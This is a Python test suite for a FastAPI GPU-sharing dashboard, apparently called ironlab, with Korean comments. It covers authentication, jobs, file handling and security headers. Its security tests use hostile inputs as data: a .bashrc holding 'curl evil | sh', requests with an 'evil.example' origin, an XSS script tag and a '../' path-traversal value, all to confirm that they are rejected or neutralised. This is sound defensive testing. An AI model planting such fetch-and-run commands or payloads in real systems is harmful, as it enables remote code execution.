import time

from fastapi.testclient import TestClient

from ironlab import users as um
from ironlab.api import create_app


def run_until(ctx, pred, timeout=5):
    end = time.time() + timeout
    while time.time() < end:
        ctx.monitor.collect()
        if pred():
            return True
        time.sleep(0.1)
    return False


def test_auth_and_roles(env):
    client, ctx, admin, alice = env
    assert client.get("/api/me").status_code == 401
    assert client.get("/api/me", headers={"Authorization": "Bearer nope"}).status_code == 401
    assert client.get("/api/me", headers=alice).json()["name"] == "alice"
    assert client.get("/api/admin/users", headers=alice).status_code == 403
    assert len(client.get("/api/admin/users", headers=admin).json()) == 2


def test_tailscale_header_login(settings):
    settings.trust_tailscale_headers = True
    app = create_app(settings, start_monitor=False)
    um.create_user(app.state.ctx.db, settings, "bob", tailscale_login="bob@github")
    c = TestClient(app, client=("127.0.0.1", 50000))        # tailscale serve 는 같은 기계에서 요청을 넘긴다
    assert c.get("/api/me", headers={"Tailscale-User-Login": "bob@github"}).json()["name"] == "bob"
    assert c.get("/api/me", headers={"Tailscale-User-Login": "eve@github"}).status_code == 401
    # 다른 곳에서 직접 온 요청이 헤더를 꾸며 내도 믿지 않는다
    far = TestClient(app, client=("172.30.0.5", 50000))
    assert far.get("/api/me", headers={"Tailscale-User-Login": "bob@github"}).status_code == 401


def test_workspace_lifecycle(env):
    client, ctx, admin, alice = env
    assert client.get("/api/workspace", headers=alice).json()["state"] == "stopped"
    w = client.post("/api/workspace/start", headers=alice).json()
    assert w["state"] == "running" and w["ssh_command"] == "ssh -p 22002 dev@gpubox.test"
    snap = ctx.monitor.collect()
    a = next(u for u in snap["users"] if u["name"] == "alice")
    assert a["workspace"]["state"] == "running"
    assert client.post("/api/workspace/stop", headers=alice).json()["state"] == "stopped"


def test_ssh_keys(env):
    client, ctx, admin, alice = env
    assert client.put("/api/me/ssh-keys", json={"keys": "not a key"}, headers=alice).status_code == 400
    key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyForTests alice@laptop"
    assert client.put("/api/me/ssh-keys", json={"keys": key}, headers=alice).json()["count"] == 1
    assert (ctx.s.keys_dir / "alice" / "authorized_keys").read_text().strip() == key


def test_job_flow(env):
    client, ctx, admin, alice = env
    r = client.post("/api/jobs", json={"command": "python gen.py && sleep 0.2", "vram_gb": 8}, headers=alice)
    assert r.status_code == 200, r.text
    jid = r.json()["id"]
    assert run_until(ctx, lambda: ctx.sched.get(jid)["status"] == "succeeded")
    j = client.get(f"/api/jobs/{jid}", headers=alice).json()
    assert j["exit_code"] == 0 and j["started_at"] and j["finished_at"]
    assert "python gen.py" in client.get(f"/api/jobs/{jid}/logs", headers=alice).text

    # 실패 작업
    r = client.post("/api/jobs", json={"command": "fail && sleep 0.1", "vram_gb": 2}, headers=alice)
    fid = r.json()["id"]
    assert run_until(ctx, lambda: ctx.sched.get(fid)["status"] == "failed")


def test_job_validation_and_privacy(env):
    client, ctx, admin, alice = env
    assert client.post("/api/jobs", json={"command": "x", "vram_gb": 40}, headers=alice).status_code == 400
    assert client.post("/api/jobs", json={"command": "x", "vram_gb": 2, "cpus": 64}, headers=alice).status_code == 400
    jid = client.post("/api/jobs", json={"command": "secret --key=abc", "vram_gb": 2}, headers=admin).json()["id"]
    seen = client.get("/api/jobs?scope=all", headers=alice).json()
    other = next(j for j in seen if j["id"] == jid)
    assert other["command"] is None
    assert client.get(f"/api/jobs/{jid}/logs", headers=alice).status_code == 403
    assert client.post(f"/api/jobs/{jid}/cancel", headers=alice).status_code == 403


def test_cancel_queued_and_running(env):
    client, ctx, admin, alice = env
    a = client.post("/api/jobs", json={"command": "sleep 30", "vram_gb": 20}, headers=alice).json()["id"]
    b = client.post("/api/jobs", json={"command": "sleep 30", "vram_gb": 20}, headers=admin).json()["id"]
    ctx.monitor.collect()
    assert ctx.sched.get(a)["status"] == "running"
    assert ctx.sched.get(b)["status"] == "queued"
    assert "VRAM" in client.get(f"/api/jobs/{b}", headers=admin).json()["wait_reason"]
    assert client.post(f"/api/jobs/{b}/cancel", headers=admin).json()["status"] == "cancelled"
    assert client.post(f"/api/jobs/{a}/cancel", headers=alice).json()["status"] == "cancelled"
    assert ctx.rt.list_managed() == []


def test_files_api(env):
    client, ctx, admin, alice = env
    r = client.post("/api/files/upload", data={"area": "home", "path": ""},
                    files={"file": ("hello.txt", b"hello world")}, headers=alice)
    assert r.status_code == 200, r.text
    names = [e["name"] for e in client.get("/api/files?area=home", headers=alice).json()["entries"]]
    assert "hello.txt" in names
    assert client.get("/api/files/download?area=home&path=hello.txt", headers=alice).content == b"hello world"
    assert client.get("/api/files?area=home&path=../boss", headers=alice).status_code == 400
    assert client.post("/api/files/upload", data={"area": "shared", "path": "models"},
                       files={"file": ("m.bin", b"x")}, headers=alice).status_code == 400
    assert client.request("DELETE", "/api/files?area=home&path=hello.txt", headers=alice).json()["ok"]


def test_overview_and_metrics(env):
    client, ctx, admin, alice = env
    client.post("/api/workspace/start", headers=alice)
    o = client.get("/api/overview", headers=alice).json()
    assert o["gpu"]["available"] and o["queue"]["total_gb"] == 24.0
    assert {u["name"] for u in o["users"]} == {"boss", "alice"}
    ctx.monitor.collect()
    assert len(client.get("/api/history", headers=alice).json()) >= 1
    assert client.get("/metrics", headers=alice).status_code == 403
    m = client.get("/metrics", headers=admin).text
    assert 'ironlab_user_workspace_running{user="alice"} 1' in m


def test_admin_disable_user(env):
    client, ctx, admin, alice = env
    client.post("/api/workspace/start", headers=alice)
    assert client.patch("/api/admin/users/alice", json={"disabled": True}, headers=admin).status_code == 200
    assert client.get("/api/me", headers=alice).status_code == 403
    assert ctx.rt.get_workspace("alice") is None


# ── 보안 ──

def ts_env(settings):
    """tailscale serve 뒤에 있는 것처럼: 요청은 127.0.0.1 에서 오고 신원은 헤더로 온다."""
    settings.trust_tailscale_headers = True
    app = create_app(settings, start_monitor=False)
    ctx = app.state.ctx
    um.create_user(ctx.db, settings, "boss", role="admin", tailscale_login="boss@github")
    um.create_user(ctx.db, settings, "alice", tailscale_login="alice@github")
    c = TestClient(app, base_url="https://gpubox.test", client=("127.0.0.1", 50000))
    return c, ctx


def test_requests_from_other_sites_are_refused(settings):
    c, ctx = ts_env(settings)
    alice = {"Tailscale-User-Login": "alice@github", "X-Forwarded-For": "100.64.0.9"}
    home = settings.users_root / "alice"
    up = dict(data={"area": "home", "path": ""}, files={"file": (".bashrc", b"curl evil | sh")})
    # 피해자가 tailnet 안에서 연 악성 페이지가 보내는 요청: 브라우저가 출처를 헤더로 알려 준다
    for evil in ({"Sec-Fetch-Site": "cross-site", "Origin": "https://evil.example"},
                 {"Sec-Fetch-Site": "same-site", "Origin": "https://other.gpubox.test"},
                 {"Origin": "https://evil.example"}):                   # Sec-Fetch-Site 를 안 보내는 브라우저
        assert c.post("/api/files/upload", headers=alice | evil, **up).status_code == 403
        assert c.post("/api/workspace/stop", headers=alice | evil).status_code == 403
    assert not (home / ".bashrc").exists()
    # 대시보드 자신이 보내는 요청과 CLI(출처 헤더 없음)는 그대로 된다
    assert c.post("/api/files/upload", headers=alice | {"Sec-Fetch-Site": "same-origin", "Origin": "https://gpubox.test"}, **up).status_code == 200
    assert c.post("/api/workspace/start", headers=alice | {"Origin": "https://gpubox.test"}).status_code == 200
    assert c.post("/api/workspace/stop", headers=alice).status_code == 200
    # 읽기 요청은 막지 않는다 (다른 사이트는 응답을 읽을 수 없다)
    assert c.get("/api/me", headers=alice | {"Sec-Fetch-Site": "cross-site"}).status_code == 200


def test_metrics_needs_login_when_reached_through_the_proxy(settings):
    c, ctx = ts_env(settings)
    ctx.monitor.collect()
    assert c.get("/metrics").status_code == 200                                     # 서버에서 직접 (Prometheus)
    assert c.get("/metrics", headers={"X-Forwarded-For": "100.64.0.9"}).status_code == 401
    assert c.get("/metrics", headers={"Tailscale-User-Login": "alice@github"}).status_code == 403
    assert c.get("/metrics", headers={"Tailscale-User-Login": "boss@github"}).status_code == 200


def test_pages_cannot_be_framed_and_are_revalidated(env):
    client, ctx, admin, alice = env
    r = client.get("/")
    assert r.headers["x-frame-options"] == "DENY" and r.headers["cache-control"] == "no-cache"
    assert client.get("/static/app.js").headers["cache-control"] == "no-cache"
    assert client.get("/api/me", headers=alice).headers["x-content-type-options"] == "nosniff"


def test_download_is_always_an_attachment(env):
    client, ctx, admin, alice = env
    client.post("/api/files/upload", data={"area": "home", "path": ""}, headers=alice,
                files={"file": ("한글 page.html", b"<script>alert(1)</script>")})
    r = client.get("/api/files/download", params={"area": "home", "path": "한글 page.html"}, headers=alice)
    assert r.status_code == 200 and r.content == b"<script>alert(1)</script>"
    assert r.headers["content-type"] == "application/octet-stream"                  # 브라우저가 HTML 로 실행하지 않는다
    assert r.headers["content-disposition"].startswith("attachment; filename*=UTF-8''%ED%95%9C")
    assert r.headers["content-length"] == "25"


def test_user_settings_are_validated(env):
    client, ctx, admin, alice = env
    for bad in ({"cpus": 0}, {"mem_gb": -5}, {"disk_gb": 0}, {"role": "root"}):
        assert client.patch("/api/admin/users/alice", json=bad, headers=admin).status_code in (400, 422), bad
    assert client.get("/api/jobs", params={"limit": -1}, headers=alice).status_code == 422
    # 마지막 관리자는 강등하거나 비활성화할 수 없다
    assert client.patch("/api/admin/users/boss", json={"role": "user"}, headers=admin).status_code == 400
    assert client.patch("/api/admin/users/boss", json={"disabled": True}, headers=admin).status_code == 400
    assert client.patch("/api/admin/users/alice", json={"role": "admin"}, headers=admin).status_code == 200
    assert client.patch("/api/admin/users/boss", json={"role": "user"}, headers=alice).status_code == 200


def test_tailscale_login_can_be_blank_shared_or_cleared(env):
    client, ctx, admin, alice = env
    # 빈칸으로 여러 명을 만들 수 있다 (예전에는 두 번째에서 서버 오류)
    for n in ("u1", "u2"):
        assert client.post("/api/admin/users", json={"name": n, "tailscale_login": ""}, headers=admin).status_code == 200
    assert client.patch("/api/admin/users/u1", json={"tailscale_login": "u1@github"}, headers=admin).status_code == 200
    r = client.patch("/api/admin/users/u2", json={"tailscale_login": "u1@github"}, headers=admin)
    assert r.status_code == 400 and "이미 연결된" in r.json()["detail"]
    r = client.patch("/api/admin/users/u1", json={"tailscale_login": ""}, headers=admin)
    assert r.status_code == 200 and r.json()["tailscale_login"] is None
